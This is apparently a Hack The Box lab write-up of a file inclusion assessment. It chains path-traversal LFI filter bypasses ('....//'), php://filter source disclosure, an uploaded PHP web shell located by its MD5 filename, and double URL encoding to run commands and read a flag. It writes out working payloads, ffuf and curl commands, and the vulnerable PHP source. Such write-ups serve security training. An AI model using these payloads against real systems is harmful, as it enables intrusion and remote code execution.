+++
title = 'File Inclusion Skill Assessment | CWES Path on HTB'
date = '2026-06-15T08:36:42-04:00'
draft = false
slug = 'file-inclusion-skill-assessment'
description = 'Chaining LFI path traversal, source code disclosure, and double URL encoding to gain RCE through an uploaded PHP shell.'
tags = ["Web", "HTB"]
difficulty = 'hard'
+++
**The challenge description:** Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

## Let's Start With Reconnaissance

The web application has some endpoints:
- `index.php`
- `contact.php`
- `apply.php`
Our interesting endpoint is `apply.php` as mentioned in the description.
![[Pasted image 20260702215813.png]]

As a start, I decided to upload a file to test the upload functionality to know which files can be uploaded to decide which approach I will go through.

- I found that the upload functionality accept all file types and there is no restriction in the file type.
- So I uploaded a `shell.php` file that contains a PHP shell.
- After submitting, the app redirected us to endpoint `thanks.php?n=`, testing it with LFI but it's not vulnerable.
- While exploring the code to know the path of the uploaded file to make me know how to access it later, I FOUND something interesting:
![[Pasted image 20260702222030.png]]
- There is another endpoint called `api/image.php` and the logo of the application is called and hashed with the parameter `p`.
- I tried to test this parameter to LFI vulnerability with basic payloads, but no one triggered it, so let's do fuzzing:
```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://154.57.164.62:32092/api/image.php?p=FUZZ' -fs 0
```
- Found that `...//` bypassed the filters and confirmed LFI vulnerability.
```url
GET /api/image.php?p=....//....//....//....//etc/passwd
```
![[Pasted image 20260702223405.png]]
- Now I want to get the source code, we have two options, to get the source code:
	- **Using Wrappers:**
```url
php://filter/read=convert.base64-encode/resource=/....//....//....//....//....//....//....//....//....//....//....//....//api/index.php
```
- Or using the default path to web root (`/var/www/html/`):
```bash
curl "http://154.57.164.62:32092//api/image.php?p=php://filter/convert.base64-encode/resource=....//....//....//....//....//....//....//....//....//....//var/www/html/index.php"
```
- But nothing is interesting in `index.php`, so I read all files to know the logic of the application:

### `Contact.php`
```php
    
 <?php
 $region = "AT";
$danger = false;

   if (isset($_GET["region"])) {
   if (str_contains($_GET["region"], ".") || 
       str_contains($_GET["region"], "/")) {
      echo "'region' parameter contains invalid character(s)";
                   $danger = true;
         } else {
                    $region = urldecode($_GET["region"]);                        }
            }

  if (!$danger) {
   include "./regions/" . $region . ".php";
                    }
```
#### The key points of the code:
- The endpoint has a `region` parameter.
- User input is directly passed to `include` function which is a direct LFI vulnerability.
- A weak non-recursive filter to check and remove only `.` and `/`.
- If the filter bypassed, a `.php` extension is added to the user input.
- `urldecode()` is applied after validation.

### `image.php`
```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>  
```
- Replace `../` too.
- Take a parameter `p` 
- The path of the images is `../images/`.

I decided to fuzz the application to know the hidden directories and the uploads directory:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://154.57.164.61:31105/FUZZ -fs 3405

```
Got some directories:
![[Pasted image 20260702234356.png]]
- Our uploads directory is `uploads`.
- I contioned fuzzing in `api` to reach any another source codes:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ  -u http://154.57.164.61:31105/api/FUZZ -fs 3405
```
Got `image.php` and `application.php`.
We knew `image`, let read `application`:
```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?> 
```
So Interesting, we know the logic now.
Our interesting here is the upload functionality and how the file is handled:
```php
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
```
- `../uploads/` (relative to `api/`, so `/var/www/html/uploads/`
- MD5 hash of the **file content** + original extension --> filename
**SO we should calculate the hash of the file we upload then the application will match and store, this is the way we can get our file in the system later too.**
## Our Attack Approach
- Upload `shell.php` PHP shell code to `apply.php`.
- Calculate the MD5 hash:
```bash
md5sum shell.php
```
--> `fc023fcacb27a7ad72d605c4e300b389`
- Now we want to access the uploaded file to gain RCE.
- As we knew before the upload path is `../uploads` but the app filter `.` and `/` so we should encode all of them:
```url
../uploads/fc023fcacb27a7ad72d605c4e300b389 
```
NOTE THAT: as I mentioned before, no need to write `.php` to the end of our file because the app add it after validation.
- After URL encoding:
```url
%2E%2E%2Fuploads%2Ffc023fcacb27a7ad72d605c4e300b389
```
 - Now everything is ready, we should send a request to `region` parameter in `contact.php`.
 ![[Pasted image 20260703000740.png]]
 - Tells us `'region' parameter contains invalid character(s)`, meaning that we don't bypass the filters.
 - I tried `Double Encoding`:
 ANND DOONE, we gain RCE now, I listed the all files in `/` using `cmd=ls -al /` to demonstrate the flag location:
 ```url
 %25%32%65%25%32%65%25%32%66%25%37%35%25%37%30%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%32%66%25%36%36%25%36%33%25%33%30%25%33%32%25%33%33%25%36%36%25%36%33%25%36%31%25%36%33%25%36%32%25%33%32%25%33%37%25%36%31%25%33%37%25%36%31%25%36%34%25%33%37%25%33%32%25%36%34%25%33%36%25%33%30%25%33%35%25%36%33%25%33%34%25%36%35%25%33%33%25%33%30%25%33%30%25%36%32%25%33%33%25%33%38%25%33%39&cmd=ls+-al+/
 ```
 
![[Pasted image 20260703001307.png]]
The flag in `flag_09ebca.txt`, just read it using `cat /flag_09ebca.txt` and done ;)

